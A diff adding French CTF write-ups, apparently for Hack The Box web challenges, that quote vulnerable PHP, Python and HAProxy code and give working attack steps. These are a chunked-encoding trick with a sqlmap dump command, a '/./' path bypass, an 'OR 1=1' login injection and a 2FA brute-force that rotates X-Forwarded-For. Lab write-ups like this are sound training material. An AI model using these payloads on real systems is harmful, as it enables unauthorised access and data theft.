@@ -412,6 +412,124 @@ En interceptant la requête avec Burp, j'ai pollué le paramètre "amount" (bien
     1337
     ------WebKitFormBoundaryvlMuH68gPztfBx1D--
     ...
-    
 
 En revenant sur l'interface et en rafraîchissant la page, le flag apparaît.
+
+## 0xBOverchunked
+
+Dans **init.sql** on trouve la condition d'obtention du flag : 
+
+    INSERT INTO posts (gamename, gamedesc, image)
+    VALUES
+    [...]
+      ('Flag', 'HTB{f4k3_fl4_f0r_t35t1ng}', '6.png');
+
+
+Dans le fichier **waf.php** on voit que tout est filtré selon une liste noire : 
+
+    <?php
+    function waf_sql_injection($input)
+    {
+        $sql_keywords = array(
+            'SELECT',
+            'INSERT',
+            [...]
+            
+La plupart des mots-clés SQL classiques sont filtrés.
+
+Dans le fichier **Cursor.php** on voit que le flag est bien censé être caché et qu'il y a deux manières de gérer les requêtes : 
+
+    <?php
+    require_once 'Connect.php';
+
+    function safequery($pdo, $id)
+    {
+        if ($id == 6)
+        {
+            die("You are not allowed to view this post!");
+        }
+
+        $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
+        $stmt->execute([$id]);
+
+        $result = $stmt->fetch(PDO::FETCH_ASSOC);
+
+        return $result;
+    }
+
+    function unsafequery($pdo, $id)
+    {
+        try
+        {
+            $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
+            $result = $stmt->fetch(PDO::FETCH_ASSOC);
+            return $result;
+        }
+        catch(Exception $e)
+        {
+            http_response_code(500);
+            echo "Internal Server Error";
+            exit();
+        }
+    }
+
+    ?>
+
+Le fichier **SearchHandler.php** nous montre que la fonction unsafequery() est utilisée si "HTTP_TRANSFER_ENCODING" est à "chunked" :
+
+    if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
+    {
+        $search = $_POST['search'];
+
+        $result = unsafequery($pdo, $search);
+        [...]
+
+Header à rajouter pour contourner la condition : 
+
+    Transfer-Encoding: chunked
+    
+
+J'ai utilisé SQLMap pour finir le challenge : 
+
+    sqlmap -r req.txt --batch --dump --level 3 --risk 3 --chunked --random-agent
+    
+
+## No-Threshold
+
+Dans le fichier **dashboard.py**, on voit que le flag se trouve dans la page du dashboard privé : 
+
+    @dashboard_bp.route("/dashboard", methods=["GET"])
+    @requires_authentication
+    def dash():
+        return render_template("private/dashboard.html", flag=Config.FLAG)
+    
+Pour accéder au dashboard, il faut être authentifié et ensuite envoyer un 2FA.
+    
+En allant sur http://83.136.249.57:39632/auth/login on tombe sur une erreur 403. Mais en regardant le fichier **haproxy.cfg** on voit qu'elle est facilement contournable : 
+
+    # External users should be blocked from accessing routes under maintenance.
+    http-request deny if { path_beg /auth/login }
+
+Le payload suivant suffit à arriver à la page : 
+
+    GET /./auth/login HTTP/1.1
+
+La seconde étape est une injection SQL simple puisqu'il n'y a pas de sanitization du tout dans le fichier **login.py** :
+
+    user = query_db(
+                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
+                one=True,
+            )
+Payload à utiliser : 
+
+    username=admin'+OR+'1'='1&password=aaaaa
+
+La dernière étape est de contourner le 2FA. Dans la configuration du HAProxy on voit qu'il y a un petit rate-limiting :
+
+    # Deny users that make more than 20 requests in a small timeframe.
+    http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
+    http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }
+
+Il suffit donc de changer le header "X-Forwarded-For" toutes les 20 requêtes.
+
+Pour ne plus répéter les étapes, j'ai fait un script Python pour automatiser tout le challenge. Voir No-Treshold.py
